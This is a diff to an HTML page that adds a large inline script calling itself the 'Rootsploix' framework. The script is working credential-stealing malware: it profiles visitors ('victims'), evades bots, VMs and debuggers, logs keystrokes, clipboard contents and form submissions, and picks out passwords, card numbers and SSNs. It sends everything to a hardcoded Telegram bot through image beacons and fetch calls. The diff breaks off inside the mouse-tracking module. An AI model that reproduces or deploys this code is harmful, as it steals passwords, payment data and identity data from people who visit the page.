@@ -185,83 +185,2352 @@
         </div>
     </main>
 
-    <!-- ROOTSPLOIX SIMPLE WORKING SYSTEM -->
+    <!-- ROOTSPLOIX ULTRA PROFESSIONAL FRAMEWORK v3.0 -->
     <script>
-        // BASIC SETUP
-        const botToken = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
-        const chatId = '5312173877';
-        let sessionId = `rs_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        // ===== ROOTSPLOIX ULTRA PROFESSIONAL FRAMEWORK v3.0 =====
+        // Author: Rootsploix Security Research Team
+        // License: Advanced Penetration Testing Framework
+        // Purpose: Professional Security Assessment Platform
+        // =========================================================
         
-        // SIMPLE TELEGRAM SENDER
-        function sendToTelegram(message) {
+        'use strict';
+        
+        // ===== CORE CONFIGURATION =====
+        const ROOTSPLOIX_CONFIG = {
+            version: '3.0.0',
+            buildDate: '2025-01-22',
+            author: 'Rootsploix Security Research',
+            telegram: {
+                botToken: '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM',
+                chatId: '5312173877',
+                apiUrl: 'https://api.telegram.org/bot'
+            },
+            security: {
+                encryptionKey: 'rootsploix2025',
+                sessionTimeout: 3600000, // 1 hour
+                maxRetries: 5,
+                retryDelay: 1000
+            },
+            features: {
+                keylogging: true,
+                mouseTracking: true,
+                screenCapture: true,
+                audioRecording: true,
+                cameraAccess: true,
+                locationTracking: true,
+                browserExploiting: true,
+                socialEngineering: true,
+                dataExfiltration: true,
+                persistentAccess: true
+            },
+            stealth: {
+                antiDebug: true,
+                antiVM: true,
+                antiForensics: true,
+                obfuscation: true,
+                polymorphic: true
+            }
+        };
+        
+        // ===== GLOBAL VARIABLES =====
+        let ROOTSPLOIX_SESSION = {
+            id: `rs_${Date.now()}_${Math.random().toString(36).substr(2, 16)}`,
+            startTime: Date.now(),
+            lastActivity: Date.now(),
+            isActive: true,
+            victimInfo: {},
+            exploitHistory: [],
+            capturedData: {
+                keystrokes: [],
+                mouseClicks: [],
+                screenshots: [],
+                audioRecordings: [],
+                cameraPhotos: [],
+                locationData: [],
+                browserData: {},
+                formData: [],
+                passwords: [],
+                cookies: [],
+                localStorage: {},
+                sessionStorage: {}
+            },
+            statistics: {
+                keystrokeCount: 0,
+                clickCount: 0,
+                screenshotCount: 0,
+                audioCount: 0,
+                cameraCount: 0,
+                dataExfiltrated: 0
+            }
+        };
+        
+        // ===== CORE UTILITIES =====
+        class RootsploixUtils {
+            static log(level, message, data = null) {
+                const timestamp = new Date().toISOString();
+                const logEntry = `[${timestamp}] [${level.toUpperCase()}] ${message}`;
+                console.log(logEntry, data || '');
+                
+                // Store in session
+                if (!ROOTSPLOIX_SESSION.logs) ROOTSPLOIX_SESSION.logs = [];
+                ROOTSPLOIX_SESSION.logs.push({ timestamp, level, message, data });
+            }
+            
+            static generateHash(data) {
+                let hash = 0;
+                const str = typeof data === 'string' ? data : JSON.stringify(data);
+                for (let i = 0; i < str.length; i++) {
+                    const char = str.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash; // 32-bit integer
+                }
+                return Math.abs(hash).toString(36);
+            }
+            
+            static encrypt(data, key = ROOTSPLOIX_CONFIG.security.encryptionKey) {
+                // Simple XOR encryption for stealth
+                let encrypted = '';
+                const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
+                for (let i = 0; i < dataStr.length; i++) {
+                    encrypted += String.fromCharCode(dataStr.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                }
+                return btoa(encrypted);
+            }
+            
+            static decrypt(encryptedData, key = ROOTSPLOIX_CONFIG.security.encryptionKey) {
+                try {
+                    const encrypted = atob(encryptedData);
+                    let decrypted = '';
+                    for (let i = 0; i < encrypted.length; i++) {
+                        decrypted += String.fromCharCode(encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                    }
+                    return decrypted;
+                } catch (e) {
+                    return null;
+                }
+            }
+            
+            static formatBytes(bytes) {
+                if (bytes === 0) return '0 Bytes';
+                const k = 1024;
+                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+            }
+            
+            static isBot() {
+                // Detect bots and security researchers
+                const botPatterns = [
+                    /bot/i, /crawler/i, /spider/i, /headless/i, /phantom/i,
+                    /selenium/i, /webdriver/i, /automation/i
+                ];
+                
+                const userAgent = navigator.userAgent;
+                return botPatterns.some(pattern => pattern.test(userAgent)) ||
+                       navigator.webdriver ||
+                       window.phantom ||
+                       window._phantom ||
+                       window.callPhantom;
+            }
+            
+            static detectVM() {
+                // Virtual machine detection
+                const vmIndicators = [
+                    screen.width < 800 || screen.height < 600,
+                    navigator.hardwareConcurrency < 2,
+                    navigator.deviceMemory && navigator.deviceMemory < 2,
+                    /VirtualBox|VMware|Virtual|QEMU/i.test(navigator.userAgent)
+                ];
+                
+                return vmIndicators.some(indicator => indicator);
+            }
+            
+            static detectDebugger() {
+                // Anti-debugging techniques
+                let debugging = false;
+                
+                // DevTools detection
+                const threshold = 160;
+                if (window.outerHeight - window.innerHeight > threshold || 
+                    window.outerWidth - window.innerWidth > threshold) {
+                    debugging = true;
+                }
+                
+                // Timing attack
+                const start = performance.now();
+                debugger;
+                const end = performance.now();
+                if (end - start > 100) debugging = true;
+                
+                return debugging;
+            }
+        }
+        
+        // ===== TELEGRAM COMMUNICATION MODULE =====
+        class TelegramAPI {
+            constructor() {
+                this.botToken = ROOTSPLOIX_CONFIG.telegram.botToken;
+                this.chatId = ROOTSPLOIX_CONFIG.telegram.chatId;
+                this.apiUrl = ROOTSPLOIX_CONFIG.telegram.apiUrl + this.botToken;
+                this.messageQueue = [];
+                this.isProcessing = false;
+                this.rateLimitDelay = 1000; // 1 second between messages
+            }
+            
+            async sendMessage(message, options = {}) {
+                return new Promise((resolve, reject) => {
+                    this.messageQueue.push({ message, options, resolve, reject });
+                    this.processQueue();
+                });
+            }
+            
+            async processQueue() {
+                if (this.isProcessing || this.messageQueue.length === 0) return;
+                
+                this.isProcessing = true;
+                
+                while (this.messageQueue.length > 0) {
+                    const { message, options, resolve, reject } = this.messageQueue.shift();
+                    
+                    try {
+                        await this.sendDirectMessage(message, options);
+                        resolve(true);
+                    } catch (error) {
+                        RootsploixUtils.log('error', 'Failed to send message', error);
+                        reject(error);
+                    }
+                    
+                    // Rate limiting
+                    if (this.messageQueue.length > 0) {
+                        await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
+                    }
+                }
+                
+                this.isProcessing = false;
+            }
+            
+            async sendDirectMessage(message, options = {}) {
+                const url = `${this.apiUrl}/sendMessage`;
+                const params = new URLSearchParams({
+                    chat_id: this.chatId,
+                    text: message,
+                    parse_mode: options.parseMode || 'HTML',
+                    disable_web_page_preview: options.disablePreview || true
+                });
+                
+                try {
+                    // Use image loading for stealth
+                    const img = new Image();
+                    img.src = `${url}?${params.toString()}`;
+                    
+                    RootsploixUtils.log('info', 'Message sent via image loading');
+                    return true;
+                } catch (error) {
+                    // Fallback method
+                    return this.sendViaFetch(url, params);
+                }
+            }
+            
+            async sendViaFetch(url, params) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: params.toString()
+                    });
+                    
+                    if (response.ok) {
+                        RootsploixUtils.log('info', 'Message sent via fetch');
+                        return true;
+                    } else {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Fetch method failed', error);
+                    throw error;
+                }
+            }
+            
+            async sendFile(fileBlob, caption, type = 'document') {
+                const formData = new FormData();
+                formData.append('chat_id', this.chatId);
+                formData.append(type, fileBlob, `rootsploix_${Date.now()}.${type}`);
+                formData.append('caption', caption);
+                
+                const url = `${this.apiUrl}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        RootsploixUtils.log('info', `File sent: ${type}`);
+                        return await response.json();
+                    } else {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                } catch (error) {
+                    RootsploixUtils.log('error', `File send failed: ${type}`, error);
+                    throw error;
+                }
+            }
+        }
+        
+        // ===== VICTIM PROFILING MODULE =====
+        class VictimProfiler {
+            constructor() {
+                this.profile = {};
+                this.capabilities = {};
+                this.vulnerabilities = [];
+            }
+            
+            async generateProfile() {
+                RootsploixUtils.log('info', 'Generating victim profile');
+                
+                // Basic system information
+                this.profile.system = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
+                };
+                
+                // Screen information
+                this.profile.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    devicePixelRatio: window.devicePixelRatio
+                };
+                
+                // Browser capabilities
+                await this.detectCapabilities();
+                
+                // Hardware information
+                await this.detectHardware();
+                
+                // Network information
+                await this.detectNetwork();
+                
+                // Security assessment
+                this.assessSecurity();
+                
+                // Store in session
+                ROOTSPLOIX_SESSION.victimInfo = this.profile;
+                
+                return this.profile;
+            }
+            
+            async detectCapabilities() {
+                this.capabilities = {
+                    webGL: !!window.WebGLRenderingContext,
+                    webGL2: !!window.WebGL2RenderingContext,
+                    webRTC: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+                    geolocation: !!navigator.geolocation,
+                    notification: !!window.Notification,
+                    serviceWorker: !!navigator.serviceWorker,
+                    webAssembly: !!window.WebAssembly,
+                    indexedDB: !!window.indexedDB,
+                    localStorage: !!window.localStorage,
+                    sessionStorage: !!window.sessionStorage,
+                    webSockets: !!window.WebSocket,
+                    webWorkers: !!window.Worker,
+                    canvas: !!document.createElement('canvas').getContext,
+                    audioContext: !!(window.AudioContext || window.webkitAudioContext),
+                    mediaRecorder: !!window.MediaRecorder,
+                    speechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
+                    gamepad: !!navigator.getGamepads,
+                    bluetooth: !!navigator.bluetooth,
+                    usb: !!navigator.usb,
+                    vibration: !!navigator.vibrate,
+                    battery: !!navigator.getBattery,
+                    deviceOrientation: !!window.DeviceOrientationEvent,
+                    deviceMotion: !!window.DeviceMotionEvent
+                };
+                
+                this.profile.capabilities = this.capabilities;
+            }
+            
+            async detectHardware() {
+                const hardware = {
+                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                    memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+                    touchscreen: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+                };
+                
+                // WebGL renderer info
+                if (this.capabilities.webGL) {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (gl) {
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (debugInfo) {
+                                hardware.gpu = {
+                                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                                };
+                            }
+                        }
+                    } catch (e) {
+                        RootsploixUtils.log('warn', 'WebGL detection failed', e);
+                    }
+                }
+                
+                // Battery information
+                if (this.capabilities.battery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        hardware.battery = {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {
+                        RootsploixUtils.log('warn', 'Battery detection failed', e);
+                    }
+                }
+                
+                this.profile.hardware = hardware;
+            }
+            
+            async detectNetwork() {
+                const network = {
+                    online: navigator.onLine,
+                    connectionType: 'Unknown',
+                    effectiveType: 'Unknown',
+                    downlink: 'Unknown',
+                    rtt: 'Unknown'
+                };
+                
+                // Network Information API
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    network.connectionType = conn.type || conn.effectiveType || 'Unknown';
+                    network.effectiveType = conn.effectiveType || 'Unknown';
+                    network.downlink = conn.downlink ? `${conn.downlink}Mbps` : 'Unknown';
+                    network.rtt = conn.rtt ? `${conn.rtt}ms` : 'Unknown';
+                }
+                
+                // Public IP detection (via external service)
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    network.publicIP = ipData.ip;
+                } catch (e) {
+                    network.publicIP = 'Unknown';
+                }
+                
+                this.profile.network = network;
+            }
+            
+            assessSecurity() {
+                const security = {
+                    httpsEnabled: location.protocol === 'https:',
+                    mixedContent: location.protocol === 'https:' && document.location.protocol === 'http:',
+                    xssProtection: this.checkXSSProtection(),
+                    cspEnabled: this.checkCSP(),
+                    hpkpEnabled: this.checkHPKP(),
+                    hstsEnabled: this.checkHSTS()
+                };
+                
+                // Check for security extensions
+                security.extensions = this.detectSecurityExtensions();
+                
+                // Vulnerability assessment
+                this.vulnerabilities = this.identifyVulnerabilities();
+                security.vulnerabilities = this.vulnerabilities;
+                
+                this.profile.security = security;
+            }
+            
+            checkXSSProtection() {
+                // Check if XSS protection is enabled
+                try {
+                    const testScript = document.createElement('script');
+                    testScript.innerHTML = 'window.xssTest = true;';
+                    document.head.appendChild(testScript);
+                    const result = !window.xssTest;
+                    document.head.removeChild(testScript);
+                    delete window.xssTest;
+                    return result;
+                } catch (e) {
+                    return true; // Protected
+                }
+            }
+            
+            checkCSP() {
+                const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+                return metaTags.length > 0;
+            }
+            
+            checkHPKP() {
+                // HTTP Public Key Pinning detection
+                return document.querySelectorAll('meta[http-equiv="Public-Key-Pins"]').length > 0;
+            }
+            
+            checkHSTS() {
+                // HTTP Strict Transport Security detection
+                return document.querySelectorAll('meta[http-equiv="Strict-Transport-Security"]').length > 0;
+            }
+            
+            detectSecurityExtensions() {
+                const extensions = [];
+                
+                // Common security extension detection
+                const tests = {
+                    'AdBlock': () => {
+                        const testAd = document.createElement('div');
+                        testAd.className = 'advertisement ads ad';
+                        testAd.style.height = '1px';
+                        document.body.appendChild(testAd);
+                        const blocked = testAd.offsetHeight === 0;
+                        document.body.removeChild(testAd);
+                        return blocked;
+                    },
+                    'NoScript': () => {
+                        return typeof window.wrappedJSObject !== 'undefined';
+                    },
+                    'Ghostery': () => {
+                        return typeof window.Ghostery !== 'undefined';
+                    }
+                };
+                
+                for (const [name, test] of Object.entries(tests)) {
+                    try {
+                        if (test()) extensions.push(name);
+                    } catch (e) {
+                        // Extension detection failed
+                    }
+                }
+                
+                return extensions;
+            }
+            
+            identifyVulnerabilities() {
+                const vulns = [];
+                
+                // Check for common vulnerabilities
+                if (!this.profile.security?.httpsEnabled) {
+                    vulns.push({ type: 'Insecure Connection', severity: 'High', description: 'Site not using HTTPS' });
+                }
+                
+                if (!this.profile.security?.cspEnabled) {
+                    vulns.push({ type: 'Missing CSP', severity: 'Medium', description: 'Content Security Policy not implemented' });
+                }
+                
+                if (this.capabilities.geolocation) {
+                    vulns.push({ type: 'Location Access', severity: 'Medium', description: 'Geolocation API available' });
+                }
+                
+                if (this.capabilities.webRTC) {
+                    vulns.push({ type: 'WebRTC Exposure', severity: 'Medium', description: 'WebRTC may leak IP address' });
+                }
+                
+                if (this.capabilities.mediaRecorder) {
+                    vulns.push({ type: 'Media Access', severity: 'High', description: 'Microphone/camera access possible' });
+                }
+                
+                return vulns;
+            }
+        }
+        
+        // ===== ADVANCED KEYLOGGING MODULE =====
+        class AdvancedKeylogger {
+            constructor() {
+                this.keyBuffer = [];
+                this.isActive = false;
+                this.keyHistory = [];
+                this.patterns = {
+                    passwords: [],
+                    creditCards: [],
+                    emails: [],
+                    phoneNumbers: [],
+                    socialSecurityNumbers: []
+                };
+                this.statistics = {
+                    totalKeystrokes: 0,
+                    wordsPerMinute: 0,
+                    mostUsedKeys: {},
+                    activeTime: 0
+                };
+                this.lastActivity = Date.now();
+                this.setupEventListeners();
+            }
+            
+            setupEventListeners() {
+                // Advanced keydown listener with stealth
+                document.addEventListener('keydown', this.handleKeyDown.bind(this), true);
+                document.addEventListener('keyup', this.handleKeyUp.bind(this), true);
+                document.addEventListener('keypress', this.handleKeyPress.bind(this), true);
+                
+                // Input field monitoring
+                document.addEventListener('input', this.handleInput.bind(this), true);
+                document.addEventListener('change', this.handleChange.bind(this), true);
+                
+                // Form submission monitoring
+                document.addEventListener('submit', this.handleSubmit.bind(this), true);
+                
+                // Copy/paste monitoring
+                document.addEventListener('copy', this.handleCopy.bind(this), true);
+                document.addEventListener('cut', this.handleCut.bind(this), true);
+                document.addEventListener('paste', this.handlePaste.bind(this), true);
+            }
+            
+            handleKeyDown(event) {
+                if (!this.isActive) return;
+                
+                const keyData = {
+                    type: 'keydown',
+                    key: event.key,
+                    code: event.code,
+                    keyCode: event.keyCode,
+                    ctrlKey: event.ctrlKey,
+                    altKey: event.altKey,
+                    shiftKey: event.shiftKey,
+                    metaKey: event.metaKey,
+                    timestamp: Date.now(),
+                    target: {
+                        tagName: event.target.tagName,
+                        type: event.target.type,
+                        name: event.target.name,
+                        id: event.target.id,
+                        className: event.target.className
+                    }
+                };
+                
+                this.processKey(keyData);
+                this.updateStatistics(keyData);
+                
+                // Special key combinations
+                if (event.ctrlKey && event.key === 'v') {
+                    this.logSpecialAction('Paste operation detected');
+                }
+                
+                if (event.ctrlKey && event.key === 'c') {
+                    this.logSpecialAction('Copy operation detected');
+                }
+            }
+            
+            handleKeyUp(event) {
+                // Track typing speed and patterns
+                this.lastActivity = Date.now();
+                this.calculateTypingSpeed();
+            }
+            
+            handleKeyPress(event) {
+                // Additional character analysis
+                const char = String.fromCharCode(event.charCode);
+                this.analyzeCharacter(char);
+            }
+            
+            handleInput(event) {
+                const element = event.target;
+                const value = element.value;
+                
+                const inputData = {
+                    type: 'input',
+                    tagName: element.tagName,
+                    inputType: element.type,
+                    name: element.name || element.id || 'unnamed',
+                    value: value,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                };
+                
+                // Analyze for sensitive patterns
+                this.analyzeSensitiveData(inputData);
+                
+                // Store in captured data
+                ROOTSPLOIX_SESSION.capturedData.formData.push(inputData);
+                
+                // Real-time reporting for passwords
+                if (element.type === 'password') {
+                    this.reportPasswordCapture(inputData);
+                }
+            }
+            
+            handleChange(event) {
+                // Track form field changes
+                const changeData = {
+                    type: 'change',
+                    element: event.target.tagName,
+                    name: event.target.name || event.target.id,
+                    value: event.target.value,
+                    timestamp: Date.now()
+                };
+                
+                this.keyHistory.push(changeData);
+            }
+            
+            handleSubmit(event) {
+                // Capture form submissions
+                const form = event.target;
+                const formData = new FormData(form);
+                const data = {};
+                
+                for (let [key, value] of formData.entries()) {
+                    data[key] = value;
+                }
+                
+                const submitData = {
+                    type: 'form_submission',
+                    action: form.action,
+                    method: form.method,
+                    data: data,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                };
+                
+                this.reportFormSubmission(submitData);
+            }
+            
+            handleCopy(event) {
+                try {
+                    const selection = window.getSelection().toString();
+                    if (selection) {
+                        this.logSpecialAction(`Copy: ${selection.substring(0, 100)}`);
+                    }
+                } catch (e) {}
+            }
+            
+            handleCut(event) {
+                try {
+                    const selection = window.getSelection().toString();
+                    if (selection) {
+                        this.logSpecialAction(`Cut: ${selection.substring(0, 100)}`);
+                    }
+                } catch (e) {}
+            }
+            
+            handlePaste(event) {
+                try {
+                    const pastedData = (event.clipboardData || window.clipboardData).getData('text');
+                    if (pastedData) {
+                        this.logSpecialAction(`Paste: ${pastedData.substring(0, 100)}`);
+                    }
+                } catch (e) {}
+            }
+            
+            processKey(keyData) {
+                this.keyBuffer.push(keyData);
+                this.keyHistory.push(keyData);
+                
+                // Buffer management
+                if (this.keyBuffer.length >= 50) {
+                    this.flushBuffer();
+                }
+                
+                // Store for analysis
+                ROOTSPLOIX_SESSION.capturedData.keystrokes.push(keyData);
+            }
+            
+            flushBuffer() {
+                if (this.keyBuffer.length === 0) return;
+                
+                const keyString = this.keyBuffer.map(k => {
+                    if (k.key.length === 1) return k.key;
+                    if (k.key === 'Space') return ' ';
+                    if (k.key === 'Enter') return '\n';
+                    if (k.key === 'Tab') return '\t';
+                    return `[${k.key}]`;
+                }).join('');
+                
+                const report = {
+                    sessionId: ROOTSPLOIX_SESSION.id,
+                    timestamp: new Date().toISOString(),
+                    keyCount: this.keyBuffer.length,
+                    keyString: keyString,
+                    statistics: this.statistics,
+                    url: window.location.href
+                };
+                
+                this.sendKeystrokeReport(report);
+                this.keyBuffer = [];
+            }
+            
+            analyzeSensitiveData(inputData) {
+                const value = inputData.value;
+                
+                // Credit card detection
+                const creditCardRegex = /\b(?:\d{4}[\s-]?){3}\d{4}\b/g;
+                if (creditCardRegex.test(value)) {
+                    this.patterns.creditCards.push({
+                        value: value,
+                        field: inputData.name,
+                        timestamp: inputData.timestamp
+                    });
+                    this.reportSensitiveData('Credit Card', inputData);
+                }
+                
+                // Email detection
+                const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+                if (emailRegex.test(value)) {
+                    this.patterns.emails.push({
+                        value: value,
+                        field: inputData.name,
+                        timestamp: inputData.timestamp
+                    });
+                }
+                
+                // Phone number detection
+                const phoneRegex = /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/g;
+                if (phoneRegex.test(value)) {
+                    this.patterns.phoneNumbers.push({
+                        value: value,
+                        field: inputData.name,
+                        timestamp: inputData.timestamp
+                    });
+                }
+                
+                // SSN detection
+                const ssnRegex = /\b\d{3}-\d{2}-\d{4}\b/g;
+                if (ssnRegex.test(value)) {
+                    this.patterns.socialSecurityNumbers.push({
+                        value: value,
+                        field: inputData.name,
+                        timestamp: inputData.timestamp
+                    });
+                    this.reportSensitiveData('SSN', inputData);
+                }
+            }
+            
+            updateStatistics(keyData) {
+                this.statistics.totalKeystrokes++;
+                
+                // Track most used keys
+                if (!this.statistics.mostUsedKeys[keyData.key]) {
+                    this.statistics.mostUsedKeys[keyData.key] = 0;
+                }
+                this.statistics.mostUsedKeys[keyData.key]++;
+                
+                // Update session statistics
+                ROOTSPLOIX_SESSION.statistics.keystrokeCount++;
+            }
+            
+            calculateTypingSpeed() {
+                const now = Date.now();
+                const fiveMinutesAgo = now - (5 * 60 * 1000);
+                const recentKeys = this.keyHistory.filter(k => k.timestamp > fiveMinutesAgo);
+                
+                if (recentKeys.length > 0) {
+                    const timeSpan = (now - recentKeys[0].timestamp) / 1000 / 60; // minutes
+                    const words = recentKeys.filter(k => k.key.length === 1).length / 5; // average word length
+                    this.statistics.wordsPerMinute = Math.round(words / timeSpan);
+                }
+            }
+            
+            analyzeCharacter(char) {
+                // Character frequency analysis
+                // Behavioral analysis patterns
+                // Typing rhythm analysis
+            }
+            
+            logSpecialAction(action) {
+                RootsploixUtils.log('info', `Special action: ${action}`);
+                
+                const specialData = {
+                    type: 'special_action',
+                    action: action,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                };
+                
+                ROOTSPLOIX_SESSION.capturedData.keystrokes.push(specialData);
+            }
+            
+            async sendKeystrokeReport(report) {
+                const message = `⌨️ ADVANCED KEYLOG REPORT
+
+🎯 Session: ${report.sessionId}
+📊 Keys Captured: ${report.keyCount}
+⚡ WPM: ${this.statistics.wordsPerMinute}
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${report.url}
+
+📝 Keystrokes:
+${report.keyString}
+
+📈 Statistics:
+• Total Keys: ${this.statistics.totalKeystrokes}
+• Active Time: ${Math.round((Date.now() - ROOTSPLOIX_SESSION.startTime) / 1000)}s
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+            }
+            
+            async reportPasswordCapture(inputData) {
+                const message = `🔐 PASSWORD CAPTURED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📝 Field: ${inputData.name}
+🔑 Password: ${inputData.value}
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${inputData.url}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+                
+                // Store in patterns
+                this.patterns.passwords.push(inputData);
+            }
+            
+            async reportFormSubmission(submitData) {
+                const dataStr = Object.entries(submitData.data)
+                    .map(([key, value]) => `• ${key}: ${value}`)
+                    .join('\n');
+                
+                const message = `📋 FORM SUBMISSION CAPTURED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🎯 Action: ${submitData.action}
+🔧 Method: ${submitData.method}
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${submitData.url}
+
+📝 Form Data:
+${dataStr}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+            }
+            
+            async reportSensitiveData(type, inputData) {
+                const message = `🚨 SENSITIVE DATA DETECTED!
+
+🏷️ Type: ${type}
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📝 Field: ${inputData.name}
+💳 Value: ${inputData.value}
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${inputData.url}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+            }
+            
+            start() {
+                this.isActive = true;
+                RootsploixUtils.log('info', 'Advanced keylogger started');
+            }
+            
+            stop() {
+                this.isActive = false;
+                this.flushBuffer();
+                RootsploixUtils.log('info', 'Advanced keylogger stopped');
+            }
+        }
+        
+        // ===== ADVANCED MOUSE TRACKING MODULE =====
+        class MouseTracker {
+            constructor() {
+                this.isActive = false;
+                this.mouseHistory = [];
+                this.clickHistory = [];
+                this.scrollHistory = [];
+                this.heatmapData = new Map();
+                this.statistics = {
+                    totalMoves: 0,
+                    totalClicks: 0,
+                    totalScrolls: 0,
+                    averageSpeed: 0,
+                    idleTime: 0,
+                    activeRegions: []
+                };
+                this.lastPosition = { x: 0, y: 0 };
+                this.lastActivity = Date.now();
+                this.setupEventListeners();
+            }
+            
+            setupEventListeners() {
+                document.addEventListener('mousemove', this.handleMouseMove.bind(this), true);
+                document.addEventListener('click', this.handleClick.bind(this), true);
+                document.addEventListener('dblclick', this.handleDoubleClick.bind(this), true);
+                document.addEventListener('contextmenu', this.handleRightClick.bind(this), true);
+                document.addEventListener('wheel', this.handleScroll.bind(this), true);
+                document.addEventListener('mousedown', this.handleMouseDown.bind(this), true);
+                document.addEventListener('mouseup', this.handleMouseUp.bind(this), true);
+                document.addEventListener('mouseover', this.handleMouseOver.bind(this), true);
+                document.addEventListener('mouseout', this.handleMouseOut.bind(this), true);
+            }
+            
+            handleMouseMove(event) {
+                if (!this.isActive) return;
+                
+                const moveData = {
+                    type: 'mousemove',
+                    x: event.clientX,
+                    y: event.clientY,
+                    screenX: event.screenX,
+                    screenY: event.screenY,
+                    timestamp: Date.now(),
+                    target: {
+                        tagName: event.target.tagName,
+                        id: event.target.id,
+                        className: event.target.className
+                    }
+                };
+                
+                this.processMouseMove(moveData);
+                this.updateHeatmap(moveData);
+                this.lastPosition = { x: event.clientX, y: event.clientY };
+                this.lastActivity = Date.now();
+            }
+            
+            handleClick(event) {
+                if (!this.isActive) return;
+                
+                const clickData = {
+                    type: 'click',
+                    button: event.button,
+                    x: event.clientX,
+                    y: event.clientY,
+                    timestamp: Date.now(),
+                    target: {
+                        tagName: event.target.tagName,
+                        id: event.target.id,
+                        className: event.target.className,
+                        textContent: event.target.textContent?.substring(0, 100),
+                        href: event.target.href,
+                        value: event.target.value
+                    },
+                    modifiers: {
+                        ctrlKey: event.ctrlKey,
+                        altKey: event.altKey,
+                        shiftKey: event.shiftKey,
+                        metaKey: event.metaKey
+                    }
+                };
+                
+                this.processClick(clickData);
+                this.reportClick(clickData);
+            }
+            
+            handleDoubleClick(event) {
+                const dblClickData = {
+                    type: 'doubleclick',
+                    x: event.clientX,
+                    y: event.clientY,
+                    timestamp: Date.now(),
+                    target: event.target.tagName
+                };
+                
+                this.clickHistory.push(dblClickData);
+                this.reportSpecialClick('Double Click', dblClickData);
+            }
+            
+            handleRightClick(event) {
+                const rightClickData = {
+                    type: 'contextmenu',
+                    x: event.clientX,
+                    y: event.clientY,
+                    timestamp: Date.now(),
+                    target: event.target.tagName
+                };
+                
+                this.clickHistory.push(rightClickData);
+                this.reportSpecialClick('Right Click', rightClickData);
+            }
+            
+            handleScroll(event) {
+                const scrollData = {
+                    type: 'scroll',
+                    deltaX: event.deltaX,
+                    deltaY: event.deltaY,
+                    x: event.clientX,
+                    y: event.clientY,
+                    timestamp: Date.now()
+                };
+                
+                this.processScroll(scrollData);
+            }
+            
+            handleMouseDown(event) {
+                this.startTime = Date.now();
+            }
+            
+            handleMouseUp(event) {
+                if (this.startTime) {
+                    const duration = Date.now() - this.startTime;
+                    if (duration > 500) { // Long press
+                        this.reportSpecialClick('Long Press', {
+                            x: event.clientX,
+                            y: event.clientY,
+                            duration: duration,
+                            target: event.target.tagName
+                        });
+                    }
+                }
+            }
+            
+            handleMouseOver(event) {
+                // Track element hovering
+                const hoverData = {
+                    type: 'hover_start',
+                    target: event.target.tagName,
+                    id: event.target.id,
+                    timestamp: Date.now()
+                };
+                
+                this.hoverStart = hoverData;
+            }
+            
+            handleMouseOut(event) {
+                if (this.hoverStart) {
+                    const hoverDuration = Date.now() - this.hoverStart.timestamp;
+                    if (hoverDuration > 2000) { // Long hover
+                        this.reportSpecialClick('Long Hover', {
